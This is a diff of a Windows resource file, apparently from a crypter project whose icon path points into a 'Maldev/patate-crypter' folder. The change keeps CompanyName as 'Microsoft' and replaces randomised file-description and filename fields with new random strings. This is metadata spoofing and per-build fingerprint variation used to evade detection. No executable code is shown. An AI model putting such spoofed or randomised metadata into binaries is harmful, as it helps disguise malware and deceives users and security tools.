@@ -68,12 +68,12 @@ BEGIN
         BLOCK "040c04b0"
         BEGIN
 			VALUE "CompanyName", "Microsoft"
-			VALUE "FileDescription", "sblujwzduxlhnhmiyiri"
+			VALUE "FileDescription", "qhffltbhaqzfykugipsz"
 			VALUE "FileVersion", "1.0.0.1"
-			VALUE "InternalName", "tkedqel.exe"
+			VALUE "InternalName", "gqhfyim.exe"
 			VALUE "LegalCopyright", "Copyright (C) 2023"
-			VALUE "OriginalFilename", "lgeagvp.exe"
-			VALUE "ProductName", "aejcvay.exe"
+			VALUE "OriginalFilename", "ddyshnw.exe"
+			VALUE "ProductName", "swtvick.exe"
             VALUE "ProductVersion", "1.0.0.1"
         END
     END
@@ -83,7 +83,7 @@ BEGIN
     END
 END
 
-MAINICON ICON "C:/Users/patate/Desktop/Programmation/C++/Low-Level/RunPE/icon.ico"
+MAINICON ICON "C:/Users/patate/Desktop/Programmation/C++/Maldev/patate-crypter/icon.ico"
 #endif
 /////////////////////////////////////////////////////////////////////////////
 
